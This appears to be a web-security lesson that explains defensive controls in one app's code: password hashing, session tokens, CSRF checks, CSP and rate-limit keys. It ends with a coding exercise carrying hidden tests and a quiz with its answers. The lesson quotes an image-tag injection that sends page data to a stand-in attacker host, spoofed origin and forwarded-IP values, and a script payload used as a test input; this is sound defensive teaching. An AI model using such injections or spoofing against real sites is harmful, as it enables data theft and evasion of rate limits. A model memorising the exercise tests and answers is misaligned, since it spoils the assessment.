---
slug: security-fundamentals
title: "Security fundamentals: authentication, sessions, CSRF, headers and secrets in a real app"
description: The OWASP risk families as a working map, and the concrete controls a senior engineer expects, from Argon2id and opaque session tokens to CSRF layers, CSP, trusted client IPs and secret handling, read through this app's code.
minutes: 34
difficulty: hard
tags: [security, owasp, authentication, sessions, csrf, xss, csp, secrets, senior-craft]
---
Most breaches do not need a zero-day. They need one endpoint that returns another user's data when you change the ID in the URL. A login form that answers in 2 ms for unknown emails and 100 ms for real ones. A session table that stores tokens in plain text, so a leaked backup is a list of logged-in accounts. A rate limiter keyed on a header the attacker controls. Each is a small decision made by someone who was thinking about features.

Security at the senior level is not a separate phase. It is a habit of asking, at every boundary, "who controls this input, and what happens if they lie?" This lesson walks through the controls you should expect in any web application, using the choices this repository makes (and a few it could make better) as the worked example.

## A map, not a checklist

The OWASP Top 10 (the 2021 edition is the one most teams cite; later editions reshuffle the list but keep the families) is best used as a map of where applications usually fail:

| OWASP 2021 category | The question it asks | Where this app answers it |
|---|---|---|
| A01 Broken access control | Can a user act on data that is not theirs? | Ownership checks in core services |
| A02 Cryptographic failures | Are secrets and credentials stored and sent safely? | Argon2id, hashed session tokens, HSTS |
| A03 Injection | Can input become code (SQL, HTML, shell)? | Parameterised ORM queries, escaped rendering, CSP |
| A04 Insecure design | Is the abuse case designed for? | Rate limits and per-user AI budgets |
| A05 Security misconfiguration | Are the defaults safe? | Config validated at boot, strict headers |
| A06 Vulnerable components | Do you know what you depend on? | Lockfiles; needs automated auditing in CI |
| A07 Identification and authentication failures | Can identity be guessed, replayed or enumerated? | Timing-uniform login, opaque revocable sessions |
| A08 Software and data integrity failures | Can the build or its inputs be tampered with? | Frozen lockfiles in the image build |
| A09 Security logging and monitoring failures | Would you notice an attack? | Structured logs with request IDs |
| A10 Server-side request forgery | Can input make the server call arbitrary URLs? | Outbound URLs come from config, never from users |

The rest of the lesson takes the rows that most often decide a security review.

## Passwords: slow on purpose

A stolen password table is attacked offline, at the attacker's pace. With a fast hash such as SHA-256, a single GPU tries billions of guesses per second, so every common password falls in minutes. The defence is a hash that is **deliberately expensive in both time and memory**, so each guess costs the attacker what it costs you.

`crates/core/src/auth/password.rs` uses **Argon2id** with the crate's defaults: 19,456 KiB of memory, 2 passes, 1 lane, and a random 16-byte salt per password. Those numbers match the minimum configuration OWASP's password storage guidance recommends. The memory requirement is the point: GPUs have thousands of cores but not thousands of 19 MiB scratch spaces, so memory-hardness caps their parallelism. The salt makes every hash unique, so identical passwords do not share a hash and precomputed tables are useless.

That cost lands on your server too, and the code handles it:

```rust
static HASH_PERMITS: LazyLock<tokio::sync::Semaphore> = LazyLock::new(|| {
    let cpus = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(2);
    tokio::sync::Semaphore::new(cpus.max(2))
});

pub async fn hash(password: String) -> AppResult<String> {
    let _permit = HASH_PERMITS.acquire().await.map_err(AppError::internal)?;
    tokio::task::spawn_blocking(move || hash_sync(&password))
        .await
        .map_err(|e| AppError::Internal(format!("join: {e}")))?
}
```

A hash takes tens of milliseconds of CPU and 19 MiB of memory. Run on Tokio's async worker threads, it would stall every other request scheduled on that thread for the duration, so `spawn_blocking` moves it to the blocking pool. The first version stopped there, and a review found the gap: Tokio's blocking pool grows to 512 threads by default and queues work beyond that, so a burst of logins could put hundreds of Argon2 computations in flight at once, each holding its 19 MiB, and memory would run out long before CPU did (512 × 19 MiB is about 9.5 GiB). The semaphore now lets at most one hash per CPU (minimum two) run at a time; the rest wait for a permit, and the authentication rate limiter bounds how many can wait. `verify` takes the same permit. The rule generalises to any CPU-heavy call in an event loop: move it off the async workers, *and* bound how much of it can be in flight. See [async and event loops](/learn/systems/concurrency/async-and-event-loops).

Password policy lives in `RegisterInput`: at least 10 characters, at most 200. Length beats composition rules ("one symbol, one digit"), which push users toward predictable patterns; current NIST guidance favours length plus screening against known-breached passwords. The upper bound caps the work a single request can force.

## Login without leaking who has an account

Here is the login path from `crates/core/src/auth/service.rs`:

```rust
let user = Users::find().filter(users::Column::Email.eq(&email)).one(&self.db).await?;
// Always verify, even for unknown users, to keep timing uniform.
let ok = password::verify(input.password, user.as_ref().map(|u| u.password_hash.clone())).await;
let Some(user) = user.filter(|_| ok) else {
    return Err(AppError::Validation("invalid email or password".into()));
};
```

When the email is unknown, `password::verify` checks the password against a precomputed `DUMMY_HASH` and returns `ok && exists`, which is always false. Both branches pay one Argon2id verification, so response time does not reveal whether an account exists. Without this, an attacker with a stopwatch could enumerate registered emails: unknown addresses would return in a millisecond and real ones in a hundred. The error message is identical in both cases for the same reason. "Precomputed" took a fix to become true: `DUMMY_HASH` is a lazily initialised static, and it used to be computed by the first unknown-email login after each boot, outside the hashing semaphore, which made that one response about twice as slow as every other. `main` now calls `password::warm_up()` before it starts serving, so the hash exists before the first request. A timing defence has to cover the first call too.

A senior reviewer would also check the *other* doors. `register` returns `Conflict("an account with that email already exists")`, so registration is an enumeration oracle even though login is not. It used to leak twice: the first version looked the email up *before* hashing, so "already registered" came back roughly 100 ms faster than a successful sign-up, and two simultaneous sign-ups for one address could both pass the check, with the loser hitting the unique index as a `500`. It now hashes first, inserts, and lets the unique index decide, mapping the violation to `409`; the integration test `concurrent_registrations_for_one_email_yield_one_account_and_conflicts` fires four sign-ups at once and expects one `200` and three `409`s. The message itself is a common, conscious trade-off: the full fix is an email-verification flow ("if this address can register, we have sent it a link"), which costs email infrastructure and friction. Here the mitigation is the per-IP authentication rate limit described below. Knowing that the trade exists, and saying so, is the senior part.

## Sessions: opaque tokens, stored hashed

After login the server needs to recognise the browser on later requests. The two families:

| | Server-side session (opaque token) | Self-contained token (JWT) |
|---|---|---|
| What the client holds | A random ID with no meaning | Signed claims (user, roles, expiry) |
| Server lookup per request | Yes (indexed primary key) | No, just verify the signature |
| Revocation | Delete the row; effective immediately | Hard: wait for expiry, or keep a denylist (which is a session table again) |
| Size | ~43 characters | Hundreds of bytes to kilobytes, on every request |
| Key management | None | Signing keys to protect and rotate |
| Best fit | First-party web apps | Service-to-service calls, federated identity, short-lived access tokens |

`migration/src/m0001_identity.rs` records the decision in its doc comment: sessions can be revoked instantly (logout-everywhere, a compromised device), and the cookie only ever carries an opaque random token. `crates/core/src/auth/token.rs` generates 32 random bytes (256 bits), encoded as 43 URL-safe base64 characters, and the database stores only its **SHA-256**. The session table's primary key *is* that hash.

The property is tested, not just intended: an integration test in `crates/api/tests/api.rs` registers a user, takes the raw token from the cookie, and asserts that no row in `sessions` contains it. The decision itself is recorded in `docs/adr/0002-server-side-sessions.md`, including the alternatives it rejected.

Why SHA-256 here when passwords needed Argon2id? Because the input's entropy is different. A password is a few dozen bits of human-chosen guessable text, so the hash must be slow. A 256-bit random token cannot be guessed at any speed, so a fast hash is enough to make a leaked table useless: an attacker who steals `sessions` holds hashes that cannot be reversed into cookies. Slow hashing is for low-entropy secrets only.

The surrounding details matter as much as the tokens:

- `token::looks_valid` rejects anything that is not exactly 43 URL-safe characters before touching the database, so garbage cookies cost nothing.
- `authenticate` deletes expired sessions it encounters, and a background task in `crates/api/src/main.rs` sweeps expired rows hourly.
- `last_seen_at` is written at most once per hour, so an authenticated request does not become a database write.
- `logout_everywhere` deletes every session for the user, which is the control you need after a password change or a lost laptop.
- Deleting the account (`DELETE /api/auth/me`) requires the password as well as the session, so a stolen cookie alone cannot erase an account. Each attempt is charged to the same per-account password budget as login (below), so a stolen session cannot become a password-guessing oracle either. A wrong password is a `422`, not a `401`: the session is valid, and a 401 would make the SPA treat the learner as signed out.

The cookie itself, set in `crates/api/src/routes/auth.rs`, is `HttpOnly` (page scripts cannot read it, so an XSS bug cannot exfiltrate it, though it can still act as the user while the page is open), `Secure` when configured, `SameSite=Lax`, and scoped to `/`. `crates/core/src/config.rs` refuses to boot in production unless `COOKIE_SECURE` is true, so a misconfigured deploy fails loudly instead of sending session cookies over plain HTTP.

## Authorisation: every query has an owner

Broken access control tops the OWASP list because it is easy to forget and invisible in happy-path tests. The pattern that leaks is "fetch by ID, return it". The fix is that every read and write of user-owned data is scoped to the caller.

`InterviewService::get` in `crates/core/src/services/interviews.rs` loads the interview and returns `NotFound` if `user_id` does not match, so another user's interview is indistinguishable from a missing one. `CommentService::delete` allows the author or an admin and returns `Forbidden` otherwise. Both checks live in the **core services**, not in route handlers, so any future entry point (a CLI, a worker) inherits them.

Two review notes. First, the comment route used to compute `user.role == "admin"` itself and pass a boolean to the service, while `users::Model::is_admin()` already existed in core: the meaning of "admin" lived in the transport layer as well as the domain, and the next role would have been added to only one of them. The route now calls `user.is_admin()`, a method on core's `CurrentUser`, so the rule is defined in core. The fix is partial, and it is worth seeing why: the service still receives a bare boolean, and core now has two `is_admin` methods (on `users::Model` and on `CurrentUser`) with the same body. Passing the principal and letting the service decide would leave one definition and one caller. Second, "fetch then compare" works but depends on every author remembering the comparison. Filtering in the query (`WHERE id = $1 AND user_id = $2`) makes the safe path the only path.

## CSRF: the problem with ambient credentials

Browsers attach cookies to requests automatically, including requests triggered by *other* sites. If `evil.example` serves a page with an auto-submitting form that POSTs to your API, the victim's browser sends it with their session cookie. The server sees a valid session and a plausible request. That is cross-site request forgery, and any cookie-authenticated API must defend against it.

`crates/api/src/middleware/csrf.rs` uses independent layers, so no single browser quirk defeats it:

1. **`SameSite=Lax` cookies.** Browsers do not send the cookie on cross-site POST, PUT or DELETE sub-requests. Lax still sends it on top-level GET navigations, which is why GET handlers must never change state.
2. **Origin check.** For every mutating method, the `Origin` header (or, if absent, the origin part of the `Referer`) must equal the configured `PUBLIC_ORIGIN` exactly: same scheme, host and port. Requests with neither header come from non-browser clients, which carry no ambient cookies.
3. **A required custom header.** Every POST, PUT, PATCH or DELETE must carry `X-Requested-With`. A cross-origin page cannot set a custom header without a CORS preflight, and this server never grants one. `web/src/lib/api.ts` adds the header to every request.

Why three? `SameSite` is a browser policy with a history of partial support, and "same-site" is not "same-origin": a compromised sibling subdomain counts as the same site. The custom-header rule depends on the server never enabling permissive CORS. Stacking them means each covers the others' gaps.

There is also a lesson in how the Referer fallback used to work. The first version compared by string prefix (`referer.starts_with(expected)`), and a Referer of `https://ascend.example.evil.net/page` starts with `https://ascend.example`. The local-development allowance had the same shape: `origin.starts_with("http://localhost")` also matches `http://localhost.evil.net`. The custom-header layer still blocked forged requests, which is exactly why defence in depth exists, but in isolation a prefix comparison of origins is a classic bug. The middleware now delegates to a plain function, `allowed(headers, public_origin)`, which reduces a Referer to its origin (everything before the first `/`, `?` or `#` after the scheme), compares origins for equality, parses the host out of a local-development origin before comparing it with `localhost` or `127.0.0.1`, and is covered by unit tests that include each look-alike. Two habits generalise: compare security identifiers by parsing and equality, never by prefix, and pull the decision out of the framework so every tricky input can be tested in microseconds. The exercise asks you to implement an equivalent rule.

```exercise
id: csrf-gate
title: Implement the CSRF gate
prompt: |
  Implement `csrf_allowed(method, headers, expected_origin)`. Header names in
  `headers` are lowercase. Rules:

  1. GET, HEAD and OPTIONS are always allowed (they must not change state).
  2. POST, PUT, PATCH and DELETE require an `x-requested-with` header;
     without it, reject.
  3. If an `origin` header is present, it must equal the expected origin,
     ignoring trailing slashes on either side.
  4. Otherwise, if a `referer` header is present, it must either equal the
     expected origin or start with the expected origin followed by `/`
     (a plain prefix match would accept `https://app.example.evil.net`).
  5. If neither header is present, allow (non-browser client).

  Return `true` to allow, `false` to reject.
languages: [python, javascript]
entry: csrf_allowed
starter:
  python: |
    def csrf_allowed(method, headers, expected_origin):
        # your code here
        return True
  javascript: |
    function csrf_allowed(method, headers, expected_origin) {
      // your code here
      return true;
    }
tests:
  - args: ["GET", {}, "https://ascend.example"]
    expected: true
    label: safe methods pass
  - args: ["POST", {"origin": "https://ascend.example", "x-requested-with": "fetch"}, "https://ascend.example"]
    expected: true
  - args: ["POST", {"origin": "https://evil.example", "x-requested-with": "fetch"}, "https://ascend.example"]
    expected: false
    label: foreign origin
  - args: ["PUT", {"origin": "https://ascend.example"}, "https://ascend.example"]
    expected: false
    label: missing custom header
  - args: ["DELETE", {"x-requested-with": "fetch"}, "https://ascend.example"]
    expected: true
    label: non-browser client
  - args: ["POST", {"referer": "https://ascend.example.evil.net/page", "x-requested-with": "fetch"}, "https://ascend.example"]
    expected: false
    hidden: true
    label: a prefix is not an origin
  - args: ["PATCH", {"referer": "https://ascend.example/learn/x", "x-requested-with": "fetch"}, "https://ascend.example/"]
    expected: true
    hidden: true
    label: trailing slash in configuration
hints:
  - "Normalise both origins by stripping trailing slashes before comparing."
  - "Check the custom header before looking at Origin or Referer; it is required for every mutating method."
```

## XSS and the Content Security Policy

Cross-site scripting is injection into HTML: attacker-controlled text rendered as markup, running script with the victim's session. The first defence is rendering, and React escapes text by default. The dangerous API is literally named `dangerouslySetInnerHTML`. Ascend used it once, for exercise prompts: `web/src/components/Exercise.tsx` escaped `&`, `<` and `>` *first* and then applied three whitelisted transformations (inline code, bold, line breaks). That was safe, but it was a second, hand-rolled Markdown renderer that every reviewer had to re-verify. Prompts now go through the same `Markdown` component as lessons (`react-markdown` with remark and rehype plugins and no raw-HTML plugin), and the codebase has no `dangerouslySetInnerHTML` at all. The one remaining direct HTML write is in `web/src/components/Mermaid.tsx`, which sets `innerHTML` to the SVG that Mermaid renders from a diagram block. That component also renders diagrams inside coach replies, which are model output, so it initialises Mermaid with `securityLevel: "strict"` (HTML in labels is encoded and click handlers are disabled). Fewer sinks is the goal; each one that remains should have a named reason and a hardening setting.

The second defence is the **Content Security Policy**, which tells the browser what the page may load and execute even if an injection slips through. `crates/api/src/middleware/security_headers.rs` sets, among others:

```text
default-src 'self';
script-src 'self' 'unsafe-eval' 'wasm-unsafe-eval' https://cdn.jsdelivr.net blob:;
img-src 'self' data: blob:;
connect-src 'self' https://cdn.jsdelivr.net https://pypi.org https://files.pythonhosted.org;
frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'
```

There is no `'unsafe-inline'` for scripts, which is what blocks the classic injected `<script>` and `onerror=` payloads. There *is* `'unsafe-eval'`, and the file's comment explains why: the in-browser code runners (Pyodide and the JavaScript sandbox) need `new Function` and WebAssembly. That is a documented, deliberate weakening, compensated elsewhere: learner code runs in Web Workers with no DOM, `web/src/runner/js.worker.ts` removes `fetch`, `XMLHttpRequest`, `WebSocket`, `importScripts`, `indexedDB` and `caches` from the worker's global scope, and `web/src/runner/index.ts` terminates any worker that exceeds its time limit, "the only reliable way to stop a runaway loop in JS or Python". A senior security review accepts a weakened control when the compensating controls are named and tested.

A review of the same policy tightened `img-src`. The first version allowed `'self' data: blob: https:`, which is any image on any HTTPS host. That looks harmless, since images do not execute, but an injected `<img src="https://attacker.example/?d=...">` is a classic way to carry data off a page with no script at all, and the attacker's server also learns who viewed the page and when. No page needed remote images, so the policy now allows only `'self' data: blob:`. Every source in a CSP should be there because a feature needs it, not because nothing obviously breaks.

The same design shows a trust boundary drawn on purpose. Because learner code runs in the browser, test results arrive at the API as claims, not facts. `docs/adr/0003-client-side-code-execution.md` states the consequence plainly: submissions are self-reported, which is acceptable for practice ("a learner who fakes a result only cheats themselves"), and leaderboards or competitive features would need server-side verification. Threat modelling is mostly this: naming what an attacker gains by lying, and deciding whether it matters.

The remaining headers each close one door: `frame-ancestors 'none'` and `X-Frame-Options: DENY` stop clickjacking, `X-Content-Type-Options: nosniff` stops the browser from executing a file served as another type, and `Strict-Transport-Security` with a one-year `max-age` tells browsers to refuse plain HTTP for this host.

## Transport: TLS everywhere

HSTS only helps if TLS is right. In production the platform terminates TLS at its edge, and the app enforces the consequences: `COOKIE_SECURE` defaults to true whenever `PUBLIC_ORIGIN` starts with `https://`, and production refuses to boot without it. The handshake below is what protects the session cookie in transit; [TLS and PKI](/learn/networking/fundamentals/tls-and-pki) covers certificates and chains.

```viz
{"type": "network", "scenario": "https-tls-handshake", "title": "TLS 1.3 protects the cookie in transit", "caption": "One round trip establishes keys; everything after, including the Cookie header, is encrypted. HSTS ensures the browser never tries plain HTTP first."}
```

## Rate limits and the client IP you can trust

Rate limits are how you design for the abuse case. `crates/api/src/middleware/rate_limit.rs` keeps four keyed limiters (the `governor` crate implements GCRA, a token-bucket-equivalent algorithm), and the interesting decision in each is the key:

| Limiter | Limit | Keyed by | Stops |
|---|---|---|---|
| `auth` (register, login) | 30 per minute | client IP | one address hammering the expensive Argon2 endpoints |
| `password_attempts` (login, account deletion) | 10 per minute | the account's email, trimmed and lowercased | guessing one learner's password, from any number of addresses |
| `general` (all of `/api`) | 1,200 per minute | client IP | one client flooding cheap reads |
| `ai` (routes that call the model) | 20 per minute | session (IP if there is none) | one learner burning model calls |

Most of that table is the result of one review finding: a whole class or office can share one NAT address, and per-IP limits punish them for it. The login bucket used to be 10 per minute per IP, which was both too tight (a class signing in together could trip it) and too weak (an attacker spreading guesses at one account across many addresses never did). It is now 30 per minute per IP, and the real defence against password guessing is the per-account limiter; its field comment says so: "This, not the per-IP bucket, is what stops a distributed attacker guessing one learner's password." Normalising the key matters: `NoBody@Example.com` with spaces around it is the same account, and the integration test `throttled_responses_say_when_to_retry` checks that such a variant is still throttled while another account from the same address is not. The general bucket used to be 300 per minute and was loosened on purpose, because every expensive route (password hashing, AI) has its own tight bucket and the general one only has to stop a single client flooding cheap reads. The AI bucket used to be keyed per IP and wrapped every coach and interview route, so thirty learners behind one address shared twenty model calls a minute, and merely reading your conversation history spent them. It now wraps only the model-calling routes, and its key is a `ClientKey`: the first 16 bytes of the SHA-256 of the session cookie (so raw tokens never sit in the limiter's memory), or the IP when there is no cookie. A forged cookie earns its own bucket but is then rejected by authentication, and it still counts against the per-IP general bucket; the integration test `ai_throttling_is_per_session_and_only_for_model_calls` throttles one learner and checks that a second learner on the same IP is unaffected. AI usage additionally has per-user daily budgets stored in the database (`migration/src/m0003_ai.rs` calls the budget table "the cost-control seam").

```viz
{"type": "system", "algorithm": "token-bucket", "title": "Keyed token buckets", "caption": "Each key (an IP, an account, a session) refills at a fixed rate up to a burst size. Password attempts get a small bucket; general browsing a large one."}
```

The limiter is only as good as its key. Behind a proxy, the socket address is the proxy, so you need the client IP from a header. The configuration comment in `crates/core/src/config.rs` states the rule: "Never trust `X-Forwarded-For` blindly: its first entry is client-controlled." An attacker who sends `X-Forwarded-For: <random IP>` on every request would get a fresh bucket each time, turning a per-IP limit into no limit (which is also why password guessing is limited per account, a key the attacker cannot vary). The app reads the IP only from the single header named in `CLIENT_IP_HEADER`, one that the trusted edge proxy sets itself (the config comment names `x-real-ip` for Railway), and otherwise falls back to the socket address. The check you still owe is that the proxy overwrites a client-supplied copy of that header rather than passing it through; if it does not, you are back to trusting the client.

The same question applies to the request ID that ties log lines together. The first version kept any `x-request-id` a client sent, so a caller could write arbitrary text into a field that operators search and trust, or reuse one ID across many requests to blur an investigation. `crates/api/src/middleware/request_id.rs` now keeps a client-supplied ID only if it parses as a UUID and otherwise drops it, so the server generates a fresh one; the integration test `request_ids_are_server_controlled` sends `<script>alert(1)</script>` and checks that it never comes back.

Two further limits of the design are worth stating in a review. The buckets live in process memory, so with two instances each IP gets double the budget; horizontal scaling means moving the state to a shared store. And IP keys are coarse: users behind one corporate NAT share a bucket, which is why the general and login limits are loose and the tight limits follow the session or the account. A per-account limit has its own cost: anyone can spend a learner's ten attempts a minute by guessing at their email, a small, self-healing lockout that is the price of stopping distributed guessing. [Rate-limiting algorithms](/learn/networking/network-algorithms/rate-limiting-algorithms) covers the distributed versions.

## Secrets

`crates/core/src/config.rs` wraps the database URL and the AI API key in `SecretString` from the `secrecy` crate. The type's `Debug` output is redacted, and reading the value requires an explicit `expose_secret()` call. Because `Config` derives `Debug`, that is what stops a `tracing::debug!(?config)` from printing the database password into your log pipeline.

The rest of secret handling is process, not code:

- Secrets come from the platform's environment, never from files in the image. The repository's `.dockerignore` excludes `.env`, because anything copied into a layer is recoverable from the image even if a later layer deletes it.
- Infrastructure code references secrets without containing them. `.railway/railway.ts` declares `ANTHROPIC_API_KEY: preserve()`, which keeps whatever value is set in the platform, so the file can be public.
- Nothing secret goes into the repository; scan for it in a pre-commit hook and in CI, because the cheapest leak to fix is the one that never lands.
- Every secret has a rotation story. Revoking an AI key should be a config change and a restart, which it is here.
- Outbound URLs come from configuration (`ANTHROPIC_BASE_URL`), never from request input, which is how you avoid server-side request forgery.

## Senior signals

- You ask **"who controls this input?"** at every boundary, including headers such as `X-Forwarded-For`, `Origin` and `Referer`.
- You can explain why passwords need a **slow, memory-hard, salted** hash while 256-bit session tokens need only **SHA-256**.
- You design login to be **timing-uniform and message-uniform**, and you know which other endpoints still enumerate accounts.
- You prefer **revocable opaque sessions** for first-party web apps and can say where JWTs genuinely win.
- You put **authorisation in the domain layer**, scoped by owner in the query, and treat 404-for-not-yours as the default.
- You treat every weakened control (`'unsafe-eval'`, a permissive CORS rule) as a **documented trade-off with named compensating controls**.

## Check yourself

```quiz
- q: >-
    Ascend stores session tokens as SHA-256 hashes but passwords as Argon2id hashes. Why is a fast hash acceptable for the tokens?
  options: ["Tokens expire within 30 days, so a stolen hash is soon useless", "Tokens are 256 random bits, so no guess rate could ever find one", "SHA-256 is a stronger algorithm than Argon2id for short inputs", "Tokens are also encrypted at rest, so the hash is a second layer"]
  answer: 1
  explanation: >-
    Slow hashing compensates for low-entropy inputs that attackers can guess. A 256-bit random token has no guessable structure, so even billions of SHA-256 attempts per second never find one. Expiry (30 days by default) limits the window but does not replace hashing, SHA-256 is faster than Argon2id rather than stronger, and the tokens are not encrypted in the database: the hash is the only protection, and it is enough.
- q: >-
    Your login returns in about 2 ms for unknown emails and about 100 ms for known ones. What is the vulnerability and the fix?
  options: ["Account enumeration; verify a dummy hash whenever the user is unknown", "SQL injection; parameterise the query that looks up the email", "Denial of service; cache the password hashes of the known accounts", "Session fixation; issue a fresh session ID after every login"]
  answer: 0
  explanation: >-
    The timing difference reveals which emails are registered. Always running one password verification, against a dummy hash if needed, makes both branches cost the same, which is what Ascend's password::verify does with DUMMY_HASH. Nothing here involves a flood, an injected query or a reused session ID: what the attacker learns is which accounts exist, and the dummy hash takes that away.
- q: >-
    A rate limiter keys login attempts on the first IP in X-Forwarded-For. What can an attacker do?
  options: ["Skip the CSRF check, since the limiter runs before the CSRF layer", "Spoof only IPv6 addresses, because IPv4 entries are checked against TCP", "Send a new fake IP each request and get a fresh bucket every time", "Nothing, because proxies replace the header with the real client IP"]
  answer: 2
  explanation: >-
    Proxies append to X-Forwarded-For; they do not remove what the client sent, so the first entry is attacker-controlled whatever its address family. Each fake IP gets its own bucket, so the per-IP limit disappears. The limiter's key has nothing to do with CSRF. Key on a header your trusted edge overwrites (Ascend reads only CLIENT_IP_HEADER, x-real-ip on Railway), or on the socket address.
- q: >-
    Which request does SameSite=Lax NOT stop the browser from sending the session cookie with?
  options: ["A top-level GET navigation from another site to your page", "A cross-site form POST that submits itself when the page loads", "A cross-site image tag whose src points at your API", "A cross-site fetch() call that uses the DELETE method"]
  answer: 0
  explanation: >-
    Lax sends cookies on top-level GET navigations so that links into your site keep users logged in. That is why state-changing operations must never be GETs. The auto-submitting POST and the cross-site DELETE use unsafe methods, and the image is a cross-site sub-request; Lax withholds the cookie from all three.
- q: >-
    The CSP in security_headers.rs includes 'unsafe-eval'. What makes this acceptable?
  options: ["Nothing; every 'unsafe-' keyword should be removed at once", "The policy also allows 'unsafe-inline' scripts, which cancels it out", "The runners need it, and learner code runs in time-limited workers", "It only relaxes CSS evaluation, so script execution is still locked down"]
  answer: 2
  explanation: >-
    A weakened control can be acceptable when the need is real and the compensating controls are explicit: Pyodide and the JavaScript sandbox need eval and WebAssembly, and learner code runs in Web Workers with no DOM that are terminated at a time limit, the JavaScript worker also losing its network APIs. The policy still forbids inline scripts, which blocks the most common injection payloads. 'unsafe-eval' governs script execution, not CSS, 'unsafe-inline' would weaken the policy further rather than cancel anything, and removing 'unsafe-eval' outright would break the runners.
```
